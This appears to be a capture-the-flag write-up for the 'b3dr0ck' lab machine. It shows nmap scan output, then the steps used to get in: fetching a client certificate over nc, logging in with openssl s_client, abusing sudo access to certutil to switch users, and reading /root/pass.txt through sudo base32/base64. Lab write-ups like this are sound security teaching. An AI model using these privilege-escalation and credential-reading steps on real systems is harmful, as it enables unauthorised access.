## Enum

### rustscan + nmap

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdQwFUWf+D4KPrnmLFLvDNxWwfz1KSykszWADhofGMt9/KW1mq5X6Qdx+JnStzc22CC25trfJYOmhyIcZj/lP2zbwCx8+Ng+31XwbnkqR1dzX6Y7KGEQbJeY48bO/nR1dsOnqFPZuKWPzN5dU3CPCYVXoNqYXxM9mJZ+oPW6hcWqD2AoPVmmda82Hir+wWNEtTjcHExY7ZxZI/Z7vsizYsNjJjBld9IGgAHErp/88h07BExG9HE+wqTZw7/JWC5H9xZqapK3wP9gVn+FGN+3JGHKuYKG6ZGc+eRel2XmIVC2PMelF4j2fY0+M8wMpXsa6MJdiyKnJwHC2V13CIvht+L1NMzV9Ajngl8FUwfQhJg46XrcJYnp1tncrA8/Vd5nar0p+9G0ppseBuM9oGB6iGvC3ssE5YFxN35a5g/0pH/JW8GWAAbzaqTxZbGauhPx+bkJIDoMosSovsYITJGi9l2bYGuv1KaJz7q3OcTVvQrBJYlEhxCo0bTwxcHNC90aU=
|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIFKDczQ8etcHAV4SsMf7e4ObthBEdiU0W4KFMbqAla7taJBkcChWf136WLVnor+e9yXT0ywIK1xKzwq7c5tZus=
|   256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4sG8C6h8Ep0TzcuQinLsiEoA1nY84Gghmr6+sHR+89


80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.19.11:4040/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)


9009/tcp open  pichat? syn-ack
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9009-TCP:V=7.92%I=7%D=11/9%Time=636BA411%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


54321/tcp open  ssl/unknown syn-ack
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-09T12:12:34
| Not valid after:  2023-11-09T12:12:34
| MD5:   e394 6bba 0f57 8e47 a32a 6a78 a4ab ab3b
| SHA-1: 6309 8c05 20e6 1676 1acd d610 7ce9 2326 0d2e f012
| -----BEGIN CERTIFICATE-----
| MIICrzCCAZcCFF2iBy53F6ZXu7Gqs2Bie4g+c3T2MA0GCSqGSIb3DQEBCwUAMBQx
| EjAQBgNVBAMMCWxvY2FsaG9zdDAeFw0yMjExMDkxMjEyMzRaFw0yMzExMDkxMjEy
| MzRaMBQxEjAQBgNVBAMMCWxvY2FsaG9zdDCCASIwDQYJKoZIhvcNAQEBBQADggEP
| ADCCAQoCggEBALfAXQeYK5kMy6Dh1seolv3I/s7SkKAbCyyXbW0ISCgHG0RpLZfS
| mlZAhDuLI0PClzM+GhxOy801YDjBm+NfRy4vuYNUWa/PL8v7ByJpNYhu5KYNFIx+
| PeEzx77xy3IX8qNiUnxXnm/hkSjUbDOS+uUjUIys5P7KTYTDp2yXMJ9h3Ax1theZ
| 0vmdUy0AA0TXZVssQiwjMhXjLBs2ta6sSbWSZyn4ZAAL4vIg9S/qBYLTWU0yHFDI
| ymD6EdeKTvnQVaFhGy1B2pXUoev5XLjV4p4T9yHLM4ZBQP9iG68HZcmtEs3uMco8
| 9Dlz6bAkJPvLcbeE9By575mjv4K1Qyt1lYsCAwEAATANBgkqhkiG9w0BAQsFAAOC
| AQEAjURstDJuwTA90UwdaRIfCZY9hbESA9O6q6Hogp23rUT2bf0Qin+Tz7yVdUfr
| cjNSKxZ/r5wZPim4ajxyULFfocZZdVDYqjycdxshyEM1ffFYvcqPNNmRH9P7FRsV
| 6Z3rmtgvb7JgwoiOp/ZM3EDwc0RQhm5RsHKREDRzucb0PSEsmFQLXrDT7gntlbOu
| UbH1GdsD5DFRF5J98SKzIRl/95YBX7MhMgBt322K6xzUA5Y+hQG+HaY24llJgmgf
| Lu6dGC+Tm4o1gt2oBSlbH4sHkBeP/6eY9v916kx6rHPIzbvf4MY0LVp4T4xo03lb
| R0khLKD378qOVXe+oANFbY6qEg==
|_-----END CERTIFICATE-----
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    Error: 'undefined' is not authorized for access.
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.92%T=SSL%I=7%D=11/9%Time=636B9A2E%P=x86_64-pc-linux-g
SF:nu%r(NULL,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x
SF:20access\.\n")%r(GenericLines,31,"Error:\x20'undefined'\x20is\x20not\x2
SF:0authorized\x20for\x20access\.\n")%r(GetRequest,31,"Error:\x20'undefine
SF:d'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(HTTPOptions,31,"
SF:Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")
SF:%r(RTSPRequest,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20
SF:for\x20access\.\n")%r(RPCCheck,31,"Error:\x20'undefined'\x20is\x20not\x
SF:20authorized\x20for\x20access\.\n")%r(DNSVersionBindReqTCP,31,"Error:\x
SF:20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(DNSSt
SF:atusRequestTCP,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20
SF:for\x20access\.\n")%r(Help,31,"Error:\x20'undefined'\x20is\x20not\x20au
SF:thorized\x20for\x20access\.\n")%r(SSLSessionReq,31,"Error:\x20'undefine
SF:d'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(TerminalServerCo
SF:okie,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acc
SF:ess\.\n")%r(TLSSessionReq,31,"Error:\x20'undefined'\x20is\x20not\x20aut
SF:horized\x20for\x20access\.\n")%r(Kerberos,31,"Error:\x20'undefined'\x20
SF:is\x20not\x20authorized\x20for\x20access\.\n")%r(SMBProgNeg,31,"Error:\
SF:x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(X11P
SF:robe,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acc
SF:ess\.\n")%r(FourOhFourRequest,31,"Error:\x20'undefined'\x20is\x20not\x2
SF:0authorized\x20for\x20access\.\n")%r(LPDString,31,"Error:\x20'undefined
SF:'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(LDAPSearchReq,31,
...

```



## exploitation

First learn about `openssl`

`└──╼ $nc 10.10.19.11 9009`

grab the files and connect: 

`OpenSSL> s_client -connect 10.10.19.11:54321 -cert certificate -key private_key `

```
b3dr0ck> password
Password hint: [SIKE! ITS REDACTED!] (user = 'Barney Rubble')
```
No...no it's not a hash...

barney is just that funny

```
barney@b3dr0ck:/home/fred$ sudo -l
[sudo] password for barney: 
Matching Defaults entries for barney on b3dr0ck:
insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
(ALL : ALL) /usr/bin/certutil
```

```
barney@b3dr0ck:/home/fred$ sudo certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30  2022 .
drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
-rw-r----- 1 root root  972 Nov  9 12:12 barney.certificate.pem
-rw-r----- 1 root root 1674 Nov  9 12:12 barney.clientKey.pem
-rw-r----- 1 root root  894 Nov  9 12:12 barney.csr.pem
-rw-r----- 1 root root 1678 Nov  9 12:12 barney.serviceKey.pem
-rw-r----- 1 root root  976 Nov  9 12:12 fred.certificate.pem
-rw-r----- 1 root root 1674 Nov  9 12:12 fred.clientKey.pem
-rw-r----- 1 root root  898 Nov  9 12:12 fred.csr.pem
-rw-r----- 1 root root 1678 Nov  9 12:12 fred.serviceKey.pem
```

Anyway...

```
barney@b3dr0ck:/home/fred$ sudo certutil cat fred.servicekey.pem
Generating credentials for user: cat (fredservicekeypem)
Generated: clientKey for cat: /usr/share/abc/certs/cat.clientKey.pem
Generated: certificate for cat: /usr/share/abc/certs/cat.certificate.pem
 ...
 
And once again

```└──╼ $openssl s_client -connect 10.10.19.11:54321 -cert certificate -key private_key 
CONNECTED(00000003)
...

b3dr0ck> password
Password hint: [LIFE IS NO THAT EZ!] (user = 'fredservicekeypem')
```
switcheroo

```
barney@b3dr0ck:/home/fred$ su fred
Password: 
fred@b3dr0ck:~$ id
uid=1000(fred) gid=1000(fred) groups=1000(fred),24(cdrom),30(dip),46(plugdev),1002(help)
```
```
fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
(ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
(ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```
Lol

first hint: its encoded multiple times

second hint: this time it's a hash!!!!

